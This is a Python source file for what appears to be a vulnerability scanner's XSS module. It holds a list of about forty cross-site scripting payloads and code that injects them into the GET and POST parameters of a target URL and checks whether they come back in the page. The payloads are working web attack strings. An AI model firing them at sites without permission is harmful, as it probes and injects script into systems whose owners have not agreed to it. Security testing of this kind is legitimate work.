import re
import time
import random
from urllib.parse import urlparse, parse_qs, urlencode
from colorama import Fore, Style

class XSSScanner:
    def __init__(self):
        self.name = "XSS Scanner"
        self.version = "2.0"
        self.payloads = self.load_payloads()
        
    def load_payloads(self):
        """Load XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "';alert(String.fromCharCode(88,83,83))//';",
            "javascript:alert('XSS')",
            "onmouseover=alert('XSS')",
            "<script>alert`XSS`</script>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<video src=x onerror=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS')></select>",
            "<keygen autofocus onfocus=alert('XSS')>",
            "<form><button formaction=javascript:alert('XSS')>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
            "<?xml version=\"1.0\"><!--><script>alert('XSS')</script>",
            "-alert`XSS`-",
            "${alert('XSS')}",
            "#{alert('XSS')}",
            "<!--<img src=\"--><img src=x onerror=alert('XSS')>",
            "<![CDATA[<script>alert('XSS')</script>]]>",
            "<embed src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<applet code=javascript:alert('XSS')>",
            "<isindex type=image src=1 onerror=alert('XSS')>",
            "<textarea autofocus onfocus=alert('XSS')>",
            "<frameset onload=alert('XSS')>",
            "<div style=\"background-image:url(javascript:alert('XSS'))\">",
            "<div style=\"width:expression(alert('XSS'))\">",
            "<style>@import 'javascript:alert(\"XSS\")';</style>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
            "<meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AEpre&AP8-alert('XSS')-&A7ADz&AGn&AG0&AE",
            "<meta charset=\"x-mac-farsi\">\"><script>alert('XSS')</script>",
            "<xss style=\"x:expression(alert('XSS'))\">",
            "<xss id=\"xss\"></xss><script>document.getElementById('xss').innerHTML='<img src=x onerror=alert(1)>'</script>"
        ]
    
    def scan(self, target, options=None):
        """Scan for XSS vulnerabilities"""
        from utils.request_wrapper import RequestWrapper
        
        results = {
            'vulnerabilities': [],
            'tested_params': 0,
            'timestamp': time.time()
        }
        
        try:
            req = RequestWrapper()
            
            # Parse URL and parameters
            parsed_url = urlparse(target)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            # Get existing parameters
            params = {}
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
            
            # If no parameters, test with common parameter names
            if not params:
                common_params = ['q', 'search', 'id', 'page', 'file', 'name', 'email']
                params = {param: ['test'] for param in common_params}
            
            # Test each parameter
            for param_name in params:
                original_value = params[param_name][0] if params[param_name] else ''
                
                for payload in self.payloads[:15]:  # Test first 15 payloads
                    # Create test parameters
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    # Test GET request
                    response = req.get(base_url, params=test_params)
                    
                    if self.detect_xss(response, payload):
                        vuln = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'parameter': param_name,
                            'payload': payload,
                            'url': response.url,
                            'method': 'GET',
                            'evidence': self.extract_evidence(response)
                        }
                        results['vulnerabilities'].append(vuln)
                        print(f"{Fore.RED}[!] XSS found in param: {param_name}")
                        break
                    
                    # Test POST request
                    response = req.post(base_url, data=test_params)
                    if self.detect_xss(response, payload):
                        vuln = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'parameter': param_name,
                            'payload': payload,
                            'url': base_url,
                            'method': 'POST',
                            'evidence': self.extract_evidence(response)
                        }
                        results['vulnerabilities'].append(vuln)
                        print(f"{Fore.RED}[!] XSS found in POST param: {param_name}")
                        break
                    
                    results['tested_params'] += 1
                    time.sleep(0.1)
            
            return results
            
        except Exception as e:
            print(f"{Fore.RED}[-] XSS scan error: {e}")
            return results
    
    def detect_xss(self, response, payload):
        """Detect XSS in response"""
        # Check if payload appears in response without proper encoding
        response_text = response.text.lower()
        payload_lower = payload.lower()
        
        # Remove script tags for comparison
        payload_clean = re.sub(r'<script>|</script>', '', payload_lower)
        
        if payload_clean in response_text:
            # Check if it's properly encoded
            if '&lt;' in response_text or '&gt;' in response_text:
                # Might be encoded, check context
                pass
            else:
                return True
        
        # Check for specific patterns
        patterns = [
            r"alert\('XSS'\)",
            r"alert\(document\.cookie\)",
            r"onerror=alert",
            r"onload=alert",
            r"javascript:alert"
        ]
        
        for pattern in patterns:
            if re.search(pattern, response_text):
                return True
        
        return False
    
    def extract_evidence(self, response):
        """Extract evidence from response"""
        evidence = {
            'status_code': response.status_code,
            'content_length': len(response.content),
            'headers': dict(response.headers)
        }
        
        # Extract relevant part of response
        response_text = response.text[:500]  # First 500 chars
        evidence['response_preview'] = response_text
        
        return evidence